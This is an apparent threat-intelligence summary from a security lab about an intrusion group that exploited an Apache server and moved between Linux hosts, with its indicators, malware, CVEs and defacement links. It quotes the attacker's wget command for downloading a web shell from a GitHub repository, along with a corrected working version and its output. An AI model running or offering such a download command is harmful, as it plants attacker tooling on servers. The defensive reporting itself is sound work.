## CONFUSED RAT indicators by Elastic Security Labs

Indicators for a threat group we’re calling CONFUSED RAT were discovered in late December 2022. This threat group exploited an Apache web server and then moved laterally to other Linux endpoints. While the threat group was able to gain initial access to the environment, they appeared to have difficulty operating remotely in non-interactive and non-login shells, and do not appear to have accomplished any objectives of note.

Throughout our research into this group, while they did have some successes, we didn’t observe anything novel that warranted a deep dive analysis that is normally hosted at Elastic Security Labs. While the tactics and techniques weren’t overly complex, we felt that the indicators were valuable to be released to the community. This summary will provide some basic context for the indicators but is not intended to serve as an analysis of the intrusion.

Instructions to ingest the indicators are in the root [indicators](../README.md) directory.

## Initial access

The initial access likely started by exploiting the Apache process. This allowed the threat actors to continue operations using the `apache2` process, which is the default process for the Apache web server on Ubuntu.

Once initial access was established, the actor made attempts to connect to remote Internet-connected endpoints to download additional tooling.

## Post exploitation

The threat actor made several attempts to load various malware and exploits, create remote shells to external endpoints, and perform internal reconnaissance of the contested Linux environment.

We did not observe any lateral movement between operating systems and the continued activity in the Linux enclave suggests that the actor(s) remained on Linux systems.

We did observe the threat actors struggle with the non-interactive and non-login shell they had through the `apache2` process.

In this example, they are trying to download an interactive transparent web shell (`connected.php`) but don't seem to understand how the Linux shell interprets the non-interactive and non-login session when using `sh -c`. They were confused enough that they began running the `--help` option for `wget` on the system they were resident on.

<img width="723" alt="image4" src="https://github.com/elastic/labs-releases/assets/7442091/a11c5c88-047b-417d-a3b9-c4670c1ac079">

When using `sh -c`,  you need to surround your command with single quotes so that the shell interprets the instructions as a single command and an argument instead of multiple commands. In the example attempted by the adversary, they tried to use `sh -c wget https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected[.]php` which is interpreted by the shell as two separate commands, `wget` and the URL, instead of a command (`wget`) and an argument (the URL). This fails because `wget` requires a URL as an argument. Because of the way the actor attempted to use `sh -c`, the URL was interpreted as another command and failed.

```bash
$ sh -c wget https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected[.]php
wget: missing URL
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
```

Had they surrounded the command with single quotes, their attempt to download `connected.php` would have been successful.

```bash
sh -c 'wget https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected[.]php'
--2023-08-28 19:03:50--  https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected[.]php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3099 (3.0K) [text/plain]
Saving to: ‘connected.php’

connected.php                                      
100%[==========================>]   3.03K  --.-KB/s    in 0s

2023-08-28 19:03:51 (9.07 MB/s) - ‘connected.php’ saved [3099/3099]
```

## Malware and exploits

The threat group employed multiple Linux malwares and exploits.

### Malware observed

* Earthworm
* Wipelog
* Frp
* Getshell
* Various webshells

### Exploits observed

* CVE-2021-4034
* CVE-2022-0847

## Additional indicator context

As stated above, the below section is to add some context to the indicators.

### Leviathan Perfect Hunter

One of the IP addresses that was used for a remote shell (`156.67.221[.]29`) also serves as a web page for a group called Leviathan Perfect Hunter (of note, this shares a name with the Github profile where `connected.php` is hosted). There are two websites for Leviathan Perfect Hunter, one is the IP address with no domain associated, and the other is `leviathanperfecthunter[.]site` (`142.132.150[.]169`).

![image1](https://github.com/elastic/labs-releases/assets/7442091/c73e4275-3cc1-48a2-8e3b-a9430a86935c)

The Leviathan Perfect Hunter team appears to focus on web server exploitation and defacement. This team uploaded a single defacement in February 2023 on the website vandalism site, Zone-Xsec.

<img width="913" alt="image8" src="https://github.com/elastic/labs-releases/assets/7442091/2faa45fd-231b-4076-925e-289640352cb4">

When researching `142.132.150[.]169` (the IP address for the `leviathianperfecthunter[.]site`) we identified that it had also been defaced and posted on Zone-Xsec by a team called “padang blackhat”, from the user _xjustfun.

![image3](https://github.com/elastic/labs-releases/assets/7442091/64bec0ec-ba3d-4cdb-b7d5-3554be421e95)

User _xjustfun was an attacker who posted their last defacement to Zone-Xsec in March of 2023.

![image6](https://github.com/elastic/labs-releases/assets/7442091/0773ef12-6821-468b-84b0-1a9b52d6d4f1)

The team “padang blackhat” posted their last defacement to Zone-Xsec in May of 2023. As of this publication, they have recorded 2,124 defacements to Zone-Xsec

![image2](https://github.com/elastic/labs-releases/assets/7442091/2c697951-014c-4587-ba03-a554833efad8)

It is unclear if _xjustfun, padang blackhat, or Leviathan Perfect Hunter are related or engaged in hacker chicanery. Padang blackhat may be a top-level defacement group, _xjustfun is a member, and Leviathan Perfect Hunter is a project owned by them.

### Suhao

When researching another indicator (`meki.google.co[.]ws`), we observed that the domain had DNS A records and a CNAME record (`suhao.github[.]io`) pointing to Github IP space and a Github repository. The owner of this repository appears to have a private profile.

```bash
$ dig meki.google.co[.]ws @8.8.8.8

; <<>> DiG 9.10.6 <<>> meki.google.co.ws @8.8.8.8
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49526
;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;meki.google.co.ws.		IN	A

;; ANSWER SECTION:
meki.google.co[.]ws.	600	IN	CNAME	suhao.github[.]io.
suhao.github[.]io.	3600	IN	A	185.199.108.153
suhao.github[.]io.	3600	IN	A	185.199.109.153
suhao.github[.]io.	3600	IN	A	185.199.110.153
suhao.github[.]io.	3600	IN	A	185.199.111.153

;; Query time: 182 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Wed Aug 30 10:40:19 CDT 2023
;; MSG SIZE  rcvd: 139
```

When analyzing the available hosts and subdomains of `co[.]ws`, we observed that they were seemingly a hopper of defaced websites. 321 sites returned an HTTP response code of `404` and 21 returned a `200`. Below are a few examples.

<img width="690" alt="image7" src="https://github.com/elastic/labs-releases/assets/7442091/c5d1886b-4af1-47f1-89a7-d79a5b376952">

<img width="735" alt="image5" src="https://github.com/elastic/labs-releases/assets/7442091/86c3f4f4-dc7e-48ba-8a9b-16860fe7ead1">

This could be a red team training ground, a mirror of defacements hosted elsewhere, a portfolio showcasing hacker skillsets, a honeynet, or something different entirely. 

In either case, the indicators collected were observed to be used in an intrusion on a network and could be used in the future.
